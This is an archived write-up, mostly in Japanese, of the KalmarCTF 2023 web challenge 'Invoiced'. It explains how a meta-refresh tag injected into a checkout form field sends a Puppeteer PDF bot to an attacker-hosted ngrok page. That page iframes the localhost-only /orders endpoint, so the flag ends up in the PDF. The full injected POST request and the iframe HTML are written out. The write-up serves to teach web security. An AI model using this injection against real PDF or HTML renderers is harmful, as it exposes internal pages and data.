# Invoiced

**CTF:** KalmarCTF 2023  
**Category:** web  
**Original writeup:** <https://blog.hamayanhamayan.com/entry/2023/03/06/083921> — by **blog.hamayanhamayan.com**. All credit goes to the original author; this is an archived copy.

---

[web] Invoiced

app.get('/orders', (req, res) => { if (req.socket.remoteAddress != "::ffff:127.0.0.1") { return res.send("Nice try") } if (req.cookies['bot']) { return res.send("Nice try") } res.setHeader('X-Frame-Options', 'none'); res.send(process.env.FLAG || 'kalmar{test_flag}') })

以上の部分をうまく通過してやればフラグが出てくる。

if (req.socket.remoteAddress != "::ffff:127.0.0.1") { -> PDF生成ボットからアクセスすれば解決

-> PDF生成ボットからアクセスすれば解決 if (req.cookies['bot']) { -> ここは頑張り所。工夫が必要

-> ここは頑張り所。工夫が必要 res.setHeader('X-Frame-Options', 'none'); -> フレームの中に入れて表示は可能

といった感じ。

PDF生成ボットを見てみると POST /checkout からアクセスするとPDFを生成してくれる。

PDFの内容は GET /renderInvoice の応答をpuppeteerで描画してPDF出力するような感じ。

特筆すべき点としては

puppeteerによるアクセス時にbotという名前のcookieが付く sameSiteはStrictなので、外部サイトからアクセスすればCookieは送られない

CSPが付く default-src 'unsafe-inline' maxcdn.bootstrapcdn.com; object-src 'none'; script-src 'none'; img-src 'self' dummyimage.com;

という感じ。

総合すると、metaタグで自分のページに誘導して、そこから GET /orders を取得すれば良さそう。

さて、まずは以下のようなリクエストを送信する。

POST /checkout HTTP/1.1 Host: invoiced.chal-kalmarc.tf Content-Length: 164 Content-Type: application/x-www-form-urlencoded Connection: close name=%3cmeta%20http-equiv%3d%22refresh%22%20content%3d'0%3b%20url%3dhttps%3a%2f%2f[yours].jp.ngrok.io'%3e&address=&phone=&email=&discount=FREEZTUFSSZ1412

discount部分はソースコードを読んでいい感じの値を入れる必要があるのだが、

あまり解法に関係しないアドホックな部分なので解説は省略する。

（それほど難しくはない）

name部分に <meta http-equiv="refresh" content='0; url=https://1b18-[yours].jp.ngrok.io'> のようにmetaタグを仕込んでいる。

これならCSPの制限は受けない。

このmetaタグによってngrokでホスティングした自分のwebサイトにリダイレクトさせている。

リダイレクト先のhtmlはこんな感じ。

こういうのを用意して python3 -m http.server 8899 みたいに公開して ngrok http 8899 でインターネット公開している。

< iframe src = "http://localhost:5000/orders" height = 1000 width = 1000 >

GET /orders をして画面描画しているだけ。

/orders での制約を再掲して、問題ないことを解説すると、

if (req.socket.remoteAddress != "::ffff:127.0.0.1") { -> PDF生成ボットがアクセスしているのでクリア

-> PDF生成ボットがアクセスしているのでクリア if (req.cookies['bot']) { -> cookieのsameSiteがStrictなので、自身のサイトからリクエストを飛ばす形（iframeでホストしてやる）にするとクリア

-> cookieのsameSiteがStrictなので、自身のサイトからリクエストを飛ばす形（iframeでホストしてやる）にするとクリア res.setHeader('X-Frame-Options', 'none'); -> フレームに入れられることを活用

のような感じとなる。

これで応答のPDFファイルの中身を見るとフラグが含まれている。
